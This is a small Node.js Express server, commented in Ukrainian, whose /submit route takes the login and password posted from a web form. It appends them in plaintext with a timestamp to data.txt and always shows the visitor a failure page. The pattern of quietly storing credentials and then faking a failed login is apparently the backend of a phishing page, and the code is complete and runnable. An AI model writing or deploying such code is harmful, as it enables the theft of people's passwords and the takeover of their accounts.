const express = require("express");
const path = require("path");
const fs = require("fs");

const app = express();

// 🧠 Додаємо підтримку form-data та JSON
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// 🔓 Робимо папку public доступною
app.use(express.static("public"));

// 📥 Обробка POST-запиту з форми
app.post("/submit", (req, res) => {
  const login = req.body.login;
  const password = req.body.password;

  const log = `[${new Date().toISOString()}] | Логін: ${login} | Пароль: ${password}\n`;
  fs.appendFileSync("data.txt", log, "utf8");

  // Відправляємо користувача на error.html
  res.sendFile(path.join(__dirname, "public", "fail.html"));
});

// 🚀 Запуск сервера
const PORT = process.env.PORT || 10000;
app.listen(PORT, () => {
  console.log(`Сервер запущено на http://localhost:${PORT}`);
});
